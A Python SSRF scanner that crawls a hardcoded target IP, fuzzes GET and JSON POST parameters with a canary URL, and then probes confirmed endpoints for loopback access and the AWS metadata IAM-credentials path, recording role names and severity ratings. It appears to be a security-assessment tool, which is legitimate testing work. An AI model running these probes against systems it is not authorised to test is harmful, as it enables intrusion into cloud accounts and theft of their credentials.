"""
SSRF Scan Engine
Discovers endpoints via crawling, tests parameters (GET query params and
JSON POST bodies) for SSRF, and checks confirmed-vulnerable endpoints for
cloud metadata reachability.
"""

import requests
import json
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

# ---- Configuration ----
TARGET_BASE = "http://35.172.250.28:8000"
CANARY_URL = "https://httpbin.org/get"  # known-good external URL used to confirm SSRF
METADATA_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
COMMON_PARAM_NAMES = ["url", "image", "src", "link", "path", "target", "file"]
COMMON_JSON_FIELD_NAMES = [
    "url", "callback_url", "webhook_url", "image_url", "target_url", "link", "src"
]
MAX_CRAWL_DEPTH = 2

VISITED = set()
DISCOVERED_ENDPOINTS = []


# ---- Phase 1: Crawling ----

def crawl(url, depth=0):
    """Basic same-domain crawler: follows <a href> links up to MAX_CRAWL_DEPTH."""
    if depth > MAX_CRAWL_DEPTH or url in VISITED:
        return
    VISITED.add(url)

    try:
        resp = requests.get(url, timeout=5)
    except requests.RequestException:
        return

    DISCOVERED_ENDPOINTS.append(url)

    if "text/html" in resp.headers.get("Content-Type", ""):
        soup = BeautifulSoup(resp.text, "html.parser")
        for link in soup.find_all("a", href=True):
            next_url = urljoin(url, link["href"])
            if urlparse(next_url).netloc == urlparse(TARGET_BASE).netloc:
                crawl(next_url, depth + 1)


# ---- Phase 2: Parameter extraction + SSRF testing ----

def extract_param_candidates(url):
    """Pull query parameters from a discovered URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return base, list(params.keys())


def test_param_for_ssrf(base_url, param_name):
    """Send the canary URL as a GET parameter value; check if the server fetched it."""
    try:
        resp = requests.get(base_url, params={param_name: CANARY_URL}, timeout=5)
    except requests.RequestException:
        return False

    if resp.status_code == 200 and (
        "httpbin" in resp.text.lower() or "origin" in resp.text.lower()
    ):
        return True
    return False


def test_json_body_for_ssrf(base_url, field_name):
    """Send the canary URL as a field in a JSON POST body; check if the server fetched it.

    This catches SSRF entry points that only accept input via a JSON request
    body (e.g. a webhook-validator endpoint expecting {"callback_url": "..."})
    rather than a GET query parameter — a gap plain GET-param fuzzing misses
    entirely.
    """
    try:
        resp = requests.post(
            base_url,
            json={field_name: CANARY_URL},
            timeout=5,
            headers={"Content-Type": "application/json"},
        )
    except requests.RequestException:
        return False

    if resp.status_code == 200 and (
        "httpbin" in resp.text.lower() or "origin" in resp.text.lower()
    ):
        return True
    return False


def discover_ssrf_endpoints():
    """Crawl the target, then test discovered + common parameters (GET and POST) for SSRF."""
    crawl(TARGET_BASE)

    confirmed_vulnerable = []
    tested_bases = set()

    # Test GET parameters actually found in discovered URLs
    for endpoint in DISCOVERED_ENDPOINTS:
        base, params = extract_param_candidates(endpoint)
        tested_bases.add(base)
        for param in params:
            if test_param_for_ssrf(base, param):
                confirmed_vulnerable.append({"url": base, "param": param, "method": "GET"})

    # Brute-force common GET param names on every discovered base path
    all_bases = tested_bases | {TARGET_BASE.rstrip("/") + "/fetch-image/"}
    for base in all_bases:
        for param in COMMON_PARAM_NAMES:
            if test_param_for_ssrf(base, param):
                entry = {"url": base, "param": param, "method": "GET"}
                if entry not in confirmed_vulnerable:
                    confirmed_vulnerable.append(entry)

    # Also try common field names as JSON POST bodies on every discovered base path —
    # catches endpoints that only accept input via a JSON request body
    for base in all_bases:
        for field in COMMON_JSON_FIELD_NAMES:
            if test_json_body_for_ssrf(base, field):
                entry = {"url": base, "param": field, "method": "POST"}
                if entry not in confirmed_vulnerable:
                    confirmed_vulnerable.append(entry)

    return confirmed_vulnerable


# ---- Phase 3: Deeper checks on confirmed-vulnerable endpoints ----

def make_request(base_url, param_name, target_url, method="GET"):
    try:
        if method == "POST":
            return requests.post(
                base_url, json={param_name: target_url}, timeout=5,
                headers={"Content-Type": "application/json"},
            )
        return requests.get(base_url, params={param_name: target_url}, timeout=5)
    except requests.RequestException:
        return None


def check_internal_reachability(base_url, param_name, method="GET"):
    """Can this endpoint reach loopback/internal addresses?"""
    resp = make_request(base_url, param_name, f"{TARGET_BASE}/", method=method)
    return resp is not None and resp.status_code == 200


def check_metadata_reachability(base_url, param_name, method="GET"):
    """Can this endpoint reach the cloud metadata service, and is IMDSv2 enforced?"""
    resp = make_request(base_url, param_name, METADATA_URL, method=method)

    finding = {
        "metadata_reachable": False,
        "imds_version_detected": None,
        "role_name": None,
        "raw_status": resp.status_code if resp else None,
    }

    if resp and resp.status_code == 200 and resp.text.strip():
        finding["metadata_reachable"] = True
        finding["imds_version_detected"] = "v1 (or v2-optional)"
        finding["role_name"] = resp.text.strip()
    elif resp and resp.status_code in (401, 403):
        finding["imds_version_detected"] = "v2 (token required, blocked)"

    return finding


# ---- Orchestration ----

def run_scan():
    results = {
        "scan_timestamp": datetime.now(timezone.utc).isoformat(),
        "target_base": TARGET_BASE,
        "discovered_vulnerable_endpoints": [],
        "findings": [],
    }

    vulnerable_endpoints = discover_ssrf_endpoints()
    results["discovered_vulnerable_endpoints"] = vulnerable_endpoints

    if not vulnerable_endpoints:
        results["findings"].append({
            "check": "ssrf_discovery",
            "vulnerable": False,
            "severity": "info",
            "note": "No SSRF-vulnerable parameters discovered via crawling, common-name GET probing, or JSON POST-body probing."
        })
        return results

    for endpoint in vulnerable_endpoints:
        base_url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint.get("method", "GET")

        finding = {
            "check": "ssrf_endpoint",
            "url": base_url,
            "param": param,
            "method": method,
            "vulnerable": True,
            "severity": "medium",
        }

        internal_reachable = check_internal_reachability(base_url, param, method=method)
        finding["internal_network_reachable"] = internal_reachable
        if internal_reachable:
            finding["severity"] = "high"

        metadata_finding = check_metadata_reachability(base_url, param, method=method)
        finding["metadata_check"] = metadata_finding
        if metadata_finding["metadata_reachable"]:
            finding["severity"] = "critical"

        results["findings"].append(finding)

    return results


if __name__ == "__main__":
    results = run_scan()
    print(json.dumps(results, indent=2))

    with open("scan_results.json", "w") as f:
        json.dump(results, f, indent=2)